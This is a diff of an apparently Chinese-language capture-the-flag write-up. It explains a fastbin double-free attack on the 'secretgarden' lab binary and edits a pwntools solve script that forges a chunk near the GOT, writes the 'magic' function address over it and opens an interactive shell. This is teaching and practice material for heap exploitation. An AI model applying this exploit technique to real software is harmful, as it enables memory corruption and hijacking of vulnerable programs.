@@ -785,7 +785,6 @@ if __name__ == "__main__":
 double free的题目，所谓double free，指的就是对同一个allocated chunk free两次，这样就可以形成一个类似**0  -> 1 -> 0**的cycled bin list，这样当我们malloc出0时，就可以修改bin list中0的fd，如**1 -> 0 -> target**，这样只要我们再malloc三次，并通过malloc的检查，就可以实现malloc到任何地址，进而实现任意地址写，至于double free的检查怎么绕过可以看这个[slide](https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf)
 
 ```python
-lab12 [master●] cat solve.py 
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __Auther__ = 'M4x'
@@ -821,13 +820,15 @@ if __name__ == "__main__":
     remove(0) # 0 -> 1 -> 0
 
     magic = ELF("./secretgarden").sym["magic"]
-    fakeChunk = 0x601ffa
-    payload = cyclic(6) + p64(0) + p64(magic) * 2
+    #  fakeChunk = 0x602028 + 2 - 8
+    fakeChunk = 0x602000+2-8
 
     Raise(0x50, p64(fakeChunk)) # 0
     Raise(0x50, "111") # 1
     Raise(0x50, "000")
     #  DEBUG()
+    #  payload = cyclic(8 - 2) + p64(magic) * 8
+    payload = cyclic(8 + 8 - 2) + p64(magic) * 2
     Raise(0x50, payload)
 
     io.interactive()
